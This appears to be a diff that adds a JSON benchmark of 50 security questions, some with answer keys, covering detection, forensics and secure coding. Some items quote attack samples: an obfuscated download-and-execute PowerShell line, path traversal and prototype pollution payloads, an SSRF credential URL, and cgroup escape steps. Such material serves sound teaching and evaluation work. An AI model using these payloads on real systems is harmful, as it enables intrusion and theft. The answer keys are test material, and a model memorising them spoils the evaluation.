@@ -1,0 +1,329 @@
+[
+  {
+    "category": "networking",
+    "difficulty": "beginner",
+    "question": "An analyst investigates a security alert showing a server listening on port 443. Upon running 'netstat -tulnp', they discover the process 'nc' (netcat) is bound to that port instead of a standard web server like Nginx or Apache. Why would a security researcher or an attacker choose port 443 for a reverse shell listener rather than a random high port like 55555, and what common network security mechanism are they attempting to bypass?",
+    "id": 1
+  },
+  {
+    "category": "networking",
+    "difficulty": "intermediate",
+    "question": "You are reviewing netflow logs for a suspected data exfiltration incident. You observe a series of ICMP Echo Request packets (Type 8) sent to an external IP. The packet sizes are consistent, but the 'Data' payload of each packet contains 32 bytes of varying hexadecimal characters that do not match standard padding patterns (e.g., 'abcdefg...'). If a stateful firewall is configured to allow outbound ICMP, why might it fail to generate an alert for this traffic, and what specific anomaly in the ICMP protocol header or payload should a defender look for to automate detection of this tunneling?",
+    "id": 2
+  },
+  {
+    "category": "networking",
+    "difficulty": "intermediate",
+    "question": "A security engineer is troubleshooting a Linux-based iptables firewall intended to allow 'RELATED' and 'ESTABLISHED' traffic. The rule 'iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT' is active. However, users report that active-mode FTP transfers are failing, while passive-mode FTP works. Which specific Linux kernel module must be loaded to allow the firewall to inspect the control channel and dynamically permit the 'RELATED' data channel for active FTP, and why is this technically necessary for a stateful firewall?",
+    "id": 3
+  },
+  {
+    "category": "networking",
+    "difficulty": "intermediate",
+    "question": "During a security audit of a branch office, you run 'arp -a' on a gateway and see two different IP addresses (192.168.1.5 and 192.168.1.10) associated with the same MAC address (00:0C:29:4F:8B:12). If 192.168.1.5 is a known file server and 192.168.1.10 is a workstation, explain the most likely networking attack occurring and describe how 'DAI' (Dynamic ARP Inspection) on a managed switch would have prevented this behavior.",
+    "id": 4
+  },
+  {
+    "category": "networking",
+    "difficulty": "advanced",
+    "question": "You are investigating a sophisticated 'Man-in-the-Side' attack. You analyze a TCP stream where the TTL (Time-to-Live) value of the initial SYN-ACK packet is 128, but the TTL of a subsequent data injection packet from the same source IP is 64. Given that the IP ID fields also show a significant non-linear jump, explain how these two specific observations (TTL discrepancy and IP ID behavior) provide evidence that the second packet was injected by a different device than the original server. How would 'TCP Timestamps' (RFC 1323) further help in confirming the packets originated from different kernel stacks?",
+    "id": 5
+  },
+  {
+    "category": "networking",
+    "difficulty": "advanced",
+    "question": "In an IPv6 environment, an attacker attempts to perform a Router Advertisement (RA) spoofing attack. The network switch has 'RA Guard' enabled. To bypass this, the attacker uses IPv6 Extension Headers to fragment the RA packet, placing the ICMPv6 header in the second fragment. Explain why this fragmentation can bypass some hardware-based RA Guard implementations and describe the 'ND Inspection' (Neighbor Discovery Inspection) mechanism that serves as a secondary layer of defense in this scenario.",
+    "id": 6
+  },
+  {
+    "category": "web security",
+    "difficulty": "beginner",
+    "question": "During a security audit, you notice a session cookie defined as: 'Set-Cookie: session_id=abc123; Path=/; Secure; SameSite=Strict'. The web application is served over HTTPS. While this configuration is strong, what specific common attack vector remains unmitigated by these flags, and which additional flag would specifically prevent client-side scripts from accessing this cookie via document.cookie?",
+    "id": 7
+  },
+  {
+    "category": "web security",
+    "difficulty": "intermediate",
+    "question": "An application uses a parameterized query for user lookups: 'SELECT * FROM users WHERE username = ?'. However, the developer implements a dynamic sorting feature: 'query = \"SELECT * FROM users WHERE username = ? ORDER BY \" + userInputColumn;'. If the 'userInputColumn' is not whitelisted, explain why a standard prepared statement placeholder (?) cannot be used for the ORDER BY clause in most SQL dialects, and describe a technique an attacker could use to extract database information despite the username itself being properly parameterized.",
+    "id": 8
+  },
+  {
+    "category": "web security",
+    "difficulty": "intermediate",
+    "question": "You are reviewing the following Nginx access logs for a Python/Flask application: '10.0.0.5 - - [12/May/2024:11:42:01] \"GET /assets/render?file=%252e%252e%252f%252e%252e%252fetc/passwd HTTP/1.1\" 200 1241'. The application has a basic filter that checks if the 'file' parameter contains the string '../'. Explain how the attacker's payload bypassed this filter and why the Nginx log shows double-encoding (%252e).",
+    "id": 9
+  },
+  {
+    "category": "web security",
+    "difficulty": "intermediate",
+    "question": "A web application implements the following Content Security Policy (CSP): \"default-src 'self'; script-src 'self' https://trusted-scripts.com; object-src 'none';\". A security researcher identifies a reflected XSS vulnerability in the search bar, but the CSP prevents execution of inline scripts. If 'https://trusted-scripts.com' hosts a known library (like an older version of AngularJS) or a JSONP endpoint, explain how the researcher can leverage this to execute arbitrary JavaScript despite the 'self' restriction.",
+    "id": 10
+  },
+  {
+    "category": "web security",
+    "difficulty": "advanced",
+    "question": "An application is hosted on an AWS EC2 instance. To prevent SSRF attacks, the developer implements a regex filter that blocks any input URL containing '169.254.169.254'. Assuming the application follows redirects and the attacker controls the domain 'evil-eval.com', describe how a DNS Rebinding attack could be used to bypass this filter and access the AWS Instance Metadata Service (IMDSv1), and explain why upgrading to IMDSv2 would mitigate this even if the filter is bypassed.",
+    "id": 11
+  },
+  {
+    "category": "web security",
+    "difficulty": "advanced",
+    "question": "Consider a Node.js application that uses a recursive merge function to update user profiles. The function does not check for 'inherited' properties. If an attacker sends a JSON payload of '{\"__proto__\": {\"isAdmin\": true}}' to the profile update endpoint, describe the specific mechanism of Prototype Pollution that occurs here and how it could lead to a persistent privilege escalation if the application later performs a check such as 'if (user.isAdmin)' on a newly instantiated user object.",
+    "id": 12
+  },
+  {
+    "category": "Linux and system security",
+    "difficulty": "beginner",
+    "question": "A system administrator creates a compiled C binary named 'update_status' and sets its permissions to -rwsr-xr-x, owned by root. They then create a shell script named 'run_update.sh' containing '#!/bin/bash\\n/usr/local/bin/update_status' and set its permissions to -rwsr-xr-x, also owned by root. When a non-privileged user executes the shell script, the internal binary works, but the script itself does not grant root privileges for any other commands added to it. Why does the setuid (SUID) bit behave differently for the binary versus the shell script on most modern Linux distributions?",
+    "id": 13
+  },
+  {
+    "category": "Linux and system security",
+    "difficulty": "intermediate",
+    "question": "An incident responder is reviewing /var/log/auth.log and notices a high frequency of 'Failed password for invalid user' messages from a single IP address targeting various common usernames. Suddenly, the logs show: 'Accepted password for sysadmin from [IP_ADDRESS] port [PORT] ssh2' followed by 'pam_unix(sshd:session): session opened for user sysadmin by (uid=0)'. If the 'sysadmin' account was supposedly restricted to SSH Key authentication only, what configuration oversight in /etc/ssh/sshd_config most likely allowed this successful password-based login?",
+    "id": 14
+  },
+  {
+    "category": "Linux and system security",
+    "difficulty": "intermediate",
+    "question": "While auditing a server, you find the following entry in the /etc/sudoers file: 'deploy-user ALL=(root) NOPASSWD: /usr/bin/zip *'. Explain the specific technical method an attacker who has compromised 'deploy-user' would use to escalate their privileges to a root shell using this specific sudo entry.",
+    "id": 15
+  },
+  {
+    "category": "Linux and system security",
+    "difficulty": "intermediate",
+    "question": "During a defensive investigation, you run 'netstat -antp' and see an established connection to a suspicious external IP on port 4444, but the 'PID/Program name' column displays only a hyphen (-). You are logged in as root. What does the absence of the PID suggest about the state of the process or the environment, and which specific subdirectory in /proc should you examine to find the metadata for all currently open sockets?",
+    "id": 16
+  },
+  {
+    "category": "Linux and system security",
+    "difficulty": "advanced",
+    "question": "A hardened Linux container is configured with a read-only root filesystem, but it has been granted the CAP_SYS_ADMIN capability. If an attacker gains execution within this container as a non-root user, describe the process by which they could use a 'cgroup v1' release_agent to execute a payload on the underlying host operating system, and explain why CAP_SYS_ADMIN is the prerequisite for this specific escape.",
+    "id": 17
+  },
+  {
+    "category": "Linux and system security",
+    "difficulty": "advanced",
+    "question": "You are analyzing a suspected user-mode rootkit. You notice that the 'ls' command hides a specific directory, but 'find' and 'python3 -c \"import os; print(os.listdir('.'))\"' both reveal it. However, 'ldd /bin/ls' shows standard library linkages. If the attacker is using the LD_PRELOAD environment variable or /etc/ld.so.preload to hook function calls, which specific C library function are they likely overriding to filter the directory listing, and why does this affect 'ls' but potentially not other tools or languages depending on their implementation?",
+    "id": 18
+  },
+  {
+    "category": "secure coding",
+    "difficulty": "beginner",
+    "question": "A developer is building a dashboard that displays user comments retrieved from a database. They are choosing between using 'element.innerHTML' and 'element.textContent' in JavaScript to inject the comment strings into the DOM. From a secure coding perspective, why is 'textContent' preferred for displaying untrusted user input, and what specific class of vulnerability does it mitigate in this context?",
+    "analysis": "This evaluates the model's understanding of DOM-based XSS and the fundamental difference between parsing a string as HTML versus treating it as raw text.",
+    "id": 19
+  },
+  {
+    "category": "secure coding",
+    "difficulty": "intermediate",
+    "question": "Analyze the following Python snippet designed to save user-uploaded profile pictures:\n\nimport os\nBASE_DIR = '/var/www/uploads/'\ndef save_image(filename, data):\n    filepath = os.path.join(BASE_DIR, filename)\n    with open(filepath, 'wb') as f:\n        f.write(data)\n\nIf an attacker provides 'filename' as '/etc/passwd', explain how 'os.path.join' behaves in this scenario and identify the resulting security vulnerability.",
+    "analysis": "This tests knowledge of language-specific library behavior. In Python, os.path.join discards previous components if an argument is an absolute path, leading to Path Traversal.",
+    "id": 20
+  },
+  {
+    "category": "secure coding",
+    "difficulty": "intermediate",
+    "question": "A web application implements a feature to sort search results. The developer uses a prepared statement for the main query but realizes they cannot bind the column name in the 'ORDER BY' clause (e.g., 'SELECT * FROM products ORDER BY ?'). To fix this, they decide to concatenate the user-provided string directly into the query: '... ORDER BY ' + user_sort_input. Even if the developer prevents semicolons and comments, what is the safest architectural approach to implement dynamic sorting while preventing SQL injection?",
+    "analysis": "This focuses on the limitation of prepared statements with identifiers and the 'Allow-list' defensive pattern, which is more robust than input filtering.",
+    "id": 21
+  },
+  {
+    "category": "secure coding",
+    "difficulty": "intermediate",
+    "question": "An application relies on the 'SameSite=Lax' attribute on its session cookies for CSRF protection. The application includes a sensitive action (deleting a user account) triggered by a GET request to '/account/delete'. Explain why 'SameSite=Lax' may fail to protect a user from a CSRF attack in this specific scenario, assuming the attacker can entice the user to click a malicious link.",
+    "analysis": "This tests understanding of modern browser security defaults. SameSite=Lax allows cookies on top-level GET navigations, meaning GET-based state changes are still vulnerable.",
+    "id": 22
+  },
+  {
+    "category": "secure coding",
+    "difficulty": "advanced",
+    "question": "Examine the following C function responsible for allocating memory for a dynamic array of fixed-size structures:\n\nvoid* allocate_buffer(size_t count) {\n    if (count > MAX_ITEMS) return NULL;\n    size_t total_size = count * sizeof(struct MyData);\n    return malloc(total_size);\n}\n\nAssuming 'MAX_ITEMS' is 1,000,000 and 'sizeof(struct MyData)' is 8192, identify the arithmetic vulnerability on a 32-bit system and describe the resulting heap state if 'count' is set to 524289.",
+    "analysis": "This requires calculating an integer overflow. 524289 * 8192 on a 32-bit system (where size_t is 32-bit) causes a wrap-around, leading to a much smaller allocation than expected and a subsequent heap buffer overflow.",
+    "id": 23
+  },
+  {
+    "category": "secure coding",
+    "difficulty": "advanced",
+    "question": "A protocol uses a custom Message Authentication Code (MAC) constructed as 'Hash(secret || message)' where 'Hash' is SHA-256. The system uses this to verify the integrity of API requests. Explain why this construction is vulnerable to a 'Length Extension Attack' and what specific modification (using the same underlying hash function) would follow industry standards to remediate this.",
+    "analysis": "This tests advanced cryptographic knowledge, specifically the vulnerability of Merkle-Damg\u00e5rd hashes to length extension when used in a simple prefix-MAC construction, and the requirement for HMAC.",
+    "id": 24
+  },
+  {
+    "category": "cryptography and authentication",
+    "difficulty": "beginner",
+    "question": "A developer is migrating a legacy system's user database. They notice passwords are stored as 'MD5(password + salt)'. While the salt is unique per user, you recommend switching to a modern KDF like Argon2id. Beyond the vulnerability of MD5 to collisions, what is the primary cryptographic reason why a simple salted hash is insufficient against modern offline brute-force attacks, and how does Argon2id specifically address this?",
+    "reasoning": "Simple hashes like MD5 or SHA-256, even when salted, are extremely fast to compute on modern GPUs/ASICs. Argon2id introduces 'cost factors'\u2014specifically memory hardness and time cost\u2014which force the attacker to dedicate significant RAM and processing cycles per attempt, making mass parallelization economically and computationally prohibitive.",
+    "id": 25
+  },
+  {
+    "category": "cryptography and authentication",
+    "difficulty": "intermediate",
+    "question": "A security analyst is reviewing a Python web application using PyJWT. The application validates tokens as follows:\n\n```python\ndef verify_token(token, public_key):\n    header = jwt.get_unverified_header(token)\n    if header['alg'] == 'HS256':\n        return jwt.decode(token, public_key, algorithms=['HS256'])\n    elif header['alg'] == 'RS256':\n        return jwt.decode(token, public_key, algorithms=['RS256'])\n```\n\nThe `public_key` variable contains a standard RSA public key string. Explain how an attacker can bypass authentication in this specific implementation without knowing the private key.",
+    "reasoning": "This is a 'Key Confusion' attack. If the attacker changes the token's header to 'HS256', the `jwt.decode` function will treat the `public_key` argument as a symmetric HMAC secret. Since the public key is known to the attacker, they can sign a malicious token using the public key as the HMAC-SHA256 secret, and the server will validate it as authentic.",
+    "id": 26
+  },
+  {
+    "category": "cryptography and authentication",
+    "difficulty": "intermediate",
+    "question": "During a network audit, you observe a series of Kerberos TGS-REQ packets originating from a single workstation. All requests specify Encryption Type 0x17 (rc4-hmac) for the requested tickets, even though the domain controllers and the workstation support AES-256 (0x12). The service names (SPNs) requested are associated with high-privilege service accounts. What specific attack does this pattern suggest, and why is the attacker forcing the use of RC4?",
+    "reasoning": "This indicates a Kerberoasting attack. The attacker is requesting service tickets (TGS-REP) to crack the service account's password offline. They force the RC4 encryption type because the RC4-HMAC algorithm is significantly faster to brute-force or use with wordlists compared to the computationally expensive PBKDF2-HMAC-SHA1 used by AES encryption.",
+    "id": 27
+  },
+  {
+    "category": "cryptography and authentication",
+    "difficulty": "intermediate",
+    "question": "A mobile application uses OAuth 2.0 with the Authorization Code Flow for user login. To improve security, the developers implemented PKCE (Proof Key for Code Exchange). If an attacker intercepts the 'Authorization Code' from the redirect URI but does not have access to the initial browser session or the application's internal memory, why does PKCE prevent them from exchanging that code for an Access Token?",
+    "reasoning": "PKCE requires the client to send a 'code_verifier' during the token exchange. This verifier must match the 'code_challenge' sent during the initial authorization request (typically via a SHA-256 hash). Since the attacker only intercepted the code and does not have the original 'code_verifier' generated by the legitimate app, the Authorization Server will reject the token request.",
+    "id": 28
+  },
+  {
+    "category": "cryptography and authentication",
+    "difficulty": "advanced",
+    "question": "An IoT device uses AES-GCM (Galois/Counter Mode) to encrypt and authenticate firmware updates. A security researcher discovers that the device uses a static 96-bit Initialization Vector (IV) for every update package. While the AES key remains secret, the researcher demonstrates they can forge a valid authentication tag for a modified firmware update. Explain the mathematical mechanism (specifically regarding the GHASH function) that allows tag forgery when an IV is reused in GCM.",
+    "reasoning": "In AES-GCM, the authentication tag is generated using GHASH, which is a universal hash function over a finite field. Reusing an IV (the 'forbidden attack') allows an attacker to XOR two different tags to eliminate the secret masking value (the encrypted zero-block). This reveals the authentication subkey (H). Once H is known, the attacker can compute the GHASH for any arbitrary message and construct a valid tag for that message.",
+    "id": 29
+  },
+  {
+    "category": "cryptography and authentication",
+    "difficulty": "advanced",
+    "question": "An enterprise environment implements TLS 1.3 to secure internal communications. A developer proposes enabling '0-RTT Early Data' to reduce latency for API calls. As a security architect, you warn that 0-RTT is susceptible to a specific type of attack on the application layer. Describe the attack, the condition that makes an HTTP request 'unsafe' for 0-RTT, and one standard mitigation the server must implement.",
+    "reasoning": "0-RTT is vulnerable to Replay Attacks because the 'early_data' is sent before the handshake completes and lacks perfect forward secrecy/uniqueness checks in the same way the full handshake does. An attacker can capture and re-send the 0-RTT packet. An HTTP request is 'unsafe' if it is non-idempotent (e.g., a POST request that transfers funds). Mitigations include the server using a 'single-use' ticket mechanism (anti-replay cache) or the application only allowing GET requests with no side effects in early data.",
+    "id": 30
+  },
+  {
+    "category": "incident response",
+    "difficulty": "beginner",
+    "question": "An incident responder identifies a workstation that is actively communicating with a known malicious C2 (Command and Control) IP address. The responder needs to stop the data exfiltration immediately while preserving the contents of the system's RAM for later analysis. Which action is the most appropriate first step: pulling the physical power cord, initiating a standard OS shutdown, or disconnecting the network interface (physically or via software)? Explain the reasoning based on the Order of Volatility.",
+    "id": 31
+  },
+  {
+    "category": "incident response",
+    "difficulty": "intermediate",
+    "question": "During an investigation into lateral movement, you analyze Windows Security Logs. You find Event ID 4624 (Successful Logon) with Logon Type 3 (Network). The 'Key Length' field is 0, and the 'Authentication Package' is NTLM. However, your organization's policy mandates Kerberos for all internal services, and NTLM is supposedly disabled via Group Policy. If this logon was not a legitimate administrative action, what specific type of credential theft or replay attack does this log signature most likely suggest was used to bypass Kerberos requirements?",
+    "id": 32
+  },
+  {
+    "category": "incident response",
+    "difficulty": "intermediate",
+    "question": "A security analyst is reviewing email headers from a suspected phishing campaign. The headers show: 'Authentication-Results: spf=pass (sender IP is 198.51.100.12) smtp.mailfrom=trusted-vendor.com; dkim=pass header.i=@trusted-vendor.com; dmarc=pass action=none header.from=billing-trusted-vendor.com'. Despite the SPF and DKIM 'pass' results, why does the DMARC pass indicate that the 'Header From' address might still be deceptive, and which specific domain is actually being validated by the SPF check in this scenario?",
+    "id": 33
+  },
+  {
+    "category": "incident response",
+    "difficulty": "advanced",
+    "question": "You are performing a live response on a compromised Linux web server. You suspect a process has been replaced via a 'process hollowing' or 'reflective loading' technique. While inspecting `/proc/[pid]/maps`, you identify a memory segment with 'rwxp' permissions (Read, Write, Execute, Private) that is not mapped to any file on the filesystem (it has no associated inode). How would you use the `/proc/[pid]/mem` file and `dd` to extract only this specific suspicious memory region for offline strings analysis or reverse engineering?",
+    "id": 34
+  },
+  {
+    "category": "incident response",
+    "difficulty": "advanced",
+    "question": "While hunting for 'Golden Ticket' attacks in a Windows Server 2019 functional level domain, you monitor Kerberos TGS-REQ (Ticket Granting Service Request) traffic. You observe several requests where the requested encryption type for the session key is RC4-HMAC (Type 23), even though the client and the service both support AES-256-CTS-HMAC-SHA1-96 (Type 18). Why is the presence of RC4-HMAC in a modern Kerberos environment a high-fidelity indicator of a forged Ticket Granting Ticket (TGT), and what does it imply about how the attacker likely generated the ticket?",
+    "id": 35
+  },
+  {
+    "category": "forensics and malware analysis",
+    "difficulty": "beginner",
+    "question": "During a forensic examination of a Windows 10 workstation, an analyst discovers an entry in the 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' registry key named 'WindowsUpdate' pointing to 'C:\\Users\\Public\\svchost.exe'. Why is this path suspicious compared to the legitimate 'svchost.exe' process, and what is the primary purpose of this specific registry key in a forensic context?",
+    "reasoning": "The analyst must recognize that legitimate system binaries like svchost.exe reside in %SystemRoot%\\System32, not user-writable directories like \\Users\\Public\\. Furthermore, they must identify the 'Run' key as a common persistence mechanism (ASEP) that executes programs upon user login.",
+    "id": 36
+  },
+  {
+    "category": "forensics and malware analysis",
+    "difficulty": "intermediate",
+    "question": "A network capture reveals a series of DNS queries for subdomains of 'update.internal-cloud.com'. The subdomains follow a pattern of high-entropy alphanumeric strings (e.g., 'a1f82b9z.update.internal-cloud.com'). The DNS server responds with TXT records containing Base64-encoded strings. Which stage of the Diamond Model of Intrusion Analysis does this activity most likely represent, and what specific technique is being utilized to bypass standard stateful firewalls that block outbound TCP/80 and TCP/443?",
+    "reasoning": "The analyst must identify the Command and Control (C2) stage. They need to recognize the pattern of DNS Tunneling/Exfiltration, where the DNS protocol (UDP/53) is used as a covert channel to transport data encapsulated in queries and records, bypassing typical web-filtering egress rules.",
+    "id": 37
+  },
+  {
+    "category": "forensics and malware analysis",
+    "difficulty": "intermediate",
+    "question": "You are analyzing a memory dump using Volatility. The 'malfind' plugin identifies a memory region in 'explorer.exe' with 'PAGE_EXECUTE_READWRITE' protections and an 'MZ' header. However, when you run 'ldrmodules', the 'InLoadOrderModuleList', 'InMemoryOrderModuleList', and 'InInitializationOrderModuleList' columns all show 'False' for that specific base address. What does this specific discrepancy tell you about how the malware was loaded into the process memory?",
+    "reasoning": "The analyst must synthesize the output of two tools. 'malfind' detects injected code/PE headers in unallocated or private memory. The 'False' values in 'ldrmodules' indicate that the module is not linked to the Process Environment Block (PEB). This confirms the malware used a manual mapping or reflective DLL injection technique rather than a standard LoadLibrary call.",
+    "id": 38
+  },
+  {
+    "category": "forensics and malware analysis",
+    "difficulty": "intermediate",
+    "question": "While performing static analysis on a malicious VBScript loader, you encounter the following obfuscated line: 'CreateObject(\"WScript.Shell\").Run(StrReverse(\")'0.1.0.721//:ptth'(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN( xei\")), 0'. Deobfuscate the string and identify the PowerShell alias being used to execute the downloaded content in memory.",
+    "reasoning": "The analyst needs to manually or mentally reverse the string: 'iex (New-Object Net.WebClient).DownloadString('http://127.0.1.0')'. They must then identify 'iex' as the alias for 'Invoke-Expression', a common method for fileless malware execution.",
+    "id": 39
+  },
+  {
+    "category": "forensics and malware analysis",
+    "difficulty": "advanced",
+    "question": "An incident responder suspects a Linux Loadable Kernel Module (LKM) rootkit is present. The 'ls' command and 'find' utility fail to show a directory named '/var/tmp/.hidden_service', but 'cd /var/tmp/.hidden_service' successfully changes the current working directory. If the rootkit is hiding files by hooking the 'iterate_shared' function in the 'file_operations' structure for the ext4 filesystem, why would a signature-based integrity checker like 'Tripwire' or 'AIDE' (running on the infected host) likely report that the filesystem binaries themselves (like /bin/ls) are unmodified?",
+    "reasoning": "The analyst must understand that modern LKM rootkits often use 'Control Flow Guard' or VFS (Virtual File System) layer hooking to filter kernel-space responses to user-space system calls (like getdents64). Since the rootkit modifies kernel behavior in memory rather than patching the on-disk binaries of the utilities themselves, the binaries' cryptographic hashes remain unchanged, bypassing standard file integrity checkers.",
+    "id": 40
+  },
+  {
+    "category": "cloud and container security",
+    "difficulty": "beginner",
+    "question": "A developer is building a Docker image and includes a line in the Dockerfile: 'RUN export API_KEY=sk-test-12345 && ./build_app.sh'. Realizing this is insecure, they add a subsequent line: 'RUN unset API_KEY'. Why does this secondary command fail to secure the API key from an attacker who gains access to the exported image, and what is the technically accurate way to handle this during build time?",
+    "reasoning": "Docker uses a layered filesystem (UnionFS). Each RUN command creates a new layer. While the environment variable is unset in the new layer, the previous layer containing the secret remains part of the image's history and can be inspected via 'docker history' or by mounting the specific layer. The correct approach is using multi-stage builds or secret mounts (e.g., --secret) which do not persist secrets in the final image layers.",
+    "id": 41
+  },
+  {
+    "category": "cloud and container security",
+    "difficulty": "intermediate",
+    "question": "An application running on an AWS EC2 instance is vulnerable to a Server-Side Request Forgery (SSRF) flaw. An attacker attempts to retrieve temporary security credentials by querying 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role'. The request fails with a 401 Unauthorized error. Upon investigation, you find the instance is using Instance Metadata Service Version 2 (IMDSv2). Describe the specific architectural change in IMDSv2 that prevented this simple SSRF attack and what the attacker would need to do to successfully retrieve the tokens.",
+    "reasoning": "IMDSv2 is session-oriented and requires a PUT request to 'http://169.254.169.254/latest/api/token' to generate a session token (X-aws-ec2-metadata-token). This token must then be included in the header of the GET request for metadata. Simple SSRF usually only allows GET requests; the attacker would need the ability to send a PUT request and set custom headers to bypass this, significantly raising the bar for exploitation.",
+    "id": 42
+  },
+  {
+    "category": "cloud and container security",
+    "difficulty": "intermediate",
+    "question": "A Kubernetes administrator is reviewing a ClusterRole associated with a CI/CD service account. The role contains the following rule: { \"apiGroups\": [\"\"], \"resources\": [\"pods/exec\"], \"verbs\": [\"create\"] }. Explain how an attacker who compromises this service account could escalate privileges to 'cluster-admin' status, assuming there are other pods running in the 'kube-system' namespace.",
+    "reasoning": "The 'pods/exec' resource with the 'create' verb allows a user to run arbitrary commands inside a pod. An attacker can target a pod in the 'kube-system' namespace (like a controller or a pod with a more privileged ServiceAccount token mounted). By exec-ing into such a pod, the attacker can steal its token from /var/run/secrets/kubernetes.io/serviceaccount/token, which likely has broader permissions, or manipulate the control plane components directly.",
+    "id": 43
+  },
+  {
+    "category": "cloud and container security",
+    "difficulty": "advanced",
+    "question": "During a container security audit, you discover a container is running with the 'CAP_SYS_ADMIN' capability and the 'cgroup' filesystem is mounted as read-write. Describe the mechanism by which an attacker could use the 'release_agent' feature in cgroups v1 to achieve a container escape and execute code on the host kernel.",
+    "reasoning": "The attacker can create a new cgroup, enable 'notify_on_release', and write a path to the 'release_agent' file. The path written to 'release_agent' must be the path as seen by the host. When the last process in that cgroup exits, the kernel executes the program specified in 'release_agent' with root privileges on the host. The attacker typically triggers this by starting a process in the sub-cgroup and immediately killing it.",
+    "id": 44
+  },
+  {
+    "category": "cloud and container security",
+    "difficulty": "advanced",
+    "question": "You are investigating a cross-account security incident. Account A has an IAM Role 'CrossAccountAdmin' with a trust policy allowing 'arn:aws:iam::AccountB:root'. You find that an attacker in Account B was able to assume this role. However, the intention was only to allow a specific application in Account B to access Account A. To prevent the 'Confused Deputy' problem in this cross-account scenario, which specific Condition key should be added to the trust policy, and what value should it represent?",
+    "reasoning": "To prevent the Confused Deputy problem in cross-account role assumption, the 'sts:ExternalId' condition should be used. The trust policy in Account A should require a unique, secret string (the External ID) that must be provided by the caller in Account B. Alternatively, 'aws:PrincipalArn' or 'aws:SourceArn' can be used to restrict access to a specific identity, but 'ExternalId' is the standard for third-party/cross-account delegation to ensure the caller is acting on behalf of the intended entity.",
+    "id": 45
+  },
+  {
+    "category": "mixed reasoning",
+    "difficulty": "beginner",
+    "question": "A network administrator configures a stateful firewall with a single explicit rule: 'Allow outbound TCP port 443 from Internal_LAN to Any'. There are no explicit inbound rules. A user on the Internal_LAN successfully browses an HTTPS website. Why does the firewall allow the return traffic from the web server back to the internal client despite the lack of an inbound rule?",
+    "reasoning_type": "conceptual reasoning",
+    "id": 46
+  },
+  {
+    "category": "mixed reasoning",
+    "difficulty": "intermediate",
+    "question": "An analyst is reviewing the following Nginx access log entry:\n\n`10.0.5.22 - - [12/Jun/2023:10:22:01 +0000] \"GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role HTTP/1.1\" 200 852 \"-\" \"Mozilla/5.0\"` \n\nBased on the URI and the specific IP address requested, what is the most likely objective of the researcher, and what architectural environment (e.g., On-premise bare metal, AWS, Kubernetes, or Localhost) are they targeting?",
+    "reasoning_type": "log analysis",
+    "id": 47
+  },
+  {
+    "category": "mixed reasoning",
+    "difficulty": "intermediate",
+    "question": "A developer provides the following Dockerfile for a security review:\n\n```Dockerfile\nFROM node:18-slim\nWORKDIR /app\nCOPY package*.json ./\nRUN npm install\nCOPY . .\nRUN groupadd -r appuser && useradd -r -g appuser appuser\nUSER appuser\nEXPOSE 3000\nENTRYPOINT [\"npm\", \"start\"]\n```\n\nThe application needs to write temporary session logs to `/var/log/app/sessions.log`. If the container is run without any external volume mounts, why will the application likely encounter an 'EACCES: permission denied' error when attempting to create the log file, and how does the `USER` instruction contribute to this?",
+    "reasoning_type": "troubleshooting / configuration analysis",
+    "id": 48
+  },
+  {
+    "category": "mixed reasoning",
+    "difficulty": "intermediate",
+    "question": "During a authorized penetration test, you discover a web application that executes a system command using user input: `system(\"ping -c 1 \" + user_input)`. You attempt to inject a second command using a semicolon (`;`), but the application returns an error: 'Illegal character detected'. However, you find that the application does not filter the newline character (`\\n`). Explain how a newline character can be used to achieve command execution in a Linux-based shell environment and why it might bypass filters looking for `;`, `&`, or `|`.",
+    "reasoning_type": "diagnosis / bypass logic",
+    "id": 49
+  },
+  {
+    "category": "mixed reasoning",
+    "difficulty": "advanced",
+    "question": "During a digital forensics and incident response (DFIR) investigation on a Windows 10 workstation, you analyze a memory dump using Volatility. You find a process, `svchost.exe`, containing a memory region with `PAGE_EXECUTE_READWRITE` (RWX) protection. Further inspection reveals this region is `MEM_PRIVATE` and is not backed by any file on disk, yet it contains an 'MZ' header at the base. What specific malware injection or loading technique is most strongly indicated by the presence of a private, unmapped RWX region containing a PE header, and why does this suggest the code was not loaded via the standard Windows Loader (LdrLoadDll)?",
+    "reasoning_type": "defensive investigation / forensics",
+    "id": 50
+  }
+]
